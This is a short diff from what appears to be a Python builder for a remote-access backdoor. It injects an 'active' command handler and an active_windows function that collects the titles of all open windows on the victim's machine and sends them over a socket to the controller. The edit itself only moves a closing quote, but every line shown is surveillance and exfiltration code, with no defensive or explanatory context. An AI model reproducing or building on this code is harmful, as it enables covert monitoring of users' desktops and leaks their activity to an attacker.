@@ -29,8 +29,7 @@ def active_windows():
     encoded = list(set(encoded))
     data = '[+]All opened windows : \\n'
     data += ''.join(encoded)
-    s.sendall(data + '\\n')
-''')
+    s.sendall(data + '\\n')''')
         config.logics.append('''
             elif command == "active":
                 active_windows()''')
